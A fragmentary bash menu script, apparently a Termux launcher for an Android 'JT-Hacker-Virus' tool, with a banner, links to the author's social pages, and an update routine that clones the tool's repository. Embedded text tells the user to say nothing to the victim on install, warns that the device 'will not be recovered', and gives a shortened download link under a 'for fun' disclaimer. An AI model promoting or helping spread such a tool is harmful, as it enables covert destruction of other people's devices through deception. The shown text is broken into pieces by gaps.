...
then
am start -a android.intent.action.VIEW -d https://www.instagram.com/last.clouds/ > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
...
then
am start -a android.intent.action.VIEW -d bio.link/timifr... > /dev/null 2>&1
banner
menu
elif [ $optnz = "8" ];
then
...
say nothing to him. when he install it in his or her 
...
I will not responsible for any kind of loss 
...
device will not be recovered.(Antivirus)
        ...
        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
                    ...
                    👆👆👆
Use only for fun purpose not for harming someone 😇✌️. 
I will not responsible for any kind of 
...
echo -e '\e[91m
         ...
         ────▌──▐────
'
echo -e "\e[93m                  CALL ME \e[92mTIMMY" | pv -qL 10
echo -e "\e[93m             IAM FROM \e[92mJT" | pv -qL 10
echo -e "\e[93m       FOLLOW MY \e[92mGEEK\e[93m CHANNEL" | pv -qL 10
...
echo -e "\e[93m        MY WEBSITE:\e[92m bio.link/timifr...\e[0m" | pv -qL 10
...
upd(){
if [ -d "$HOME/JT-Hacker-Virus" ];
then
cd $HOME
rm -rf JT-HACKER-VIRUS
elif [ -d "$HOME/JT-Hacker-Virus" ];
then
cd $HOME
rm -rf JT-HACKER-VIRUS
else
...
while git clone https://github.com/Timmydudew/JT-HACKER-VIRUS> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
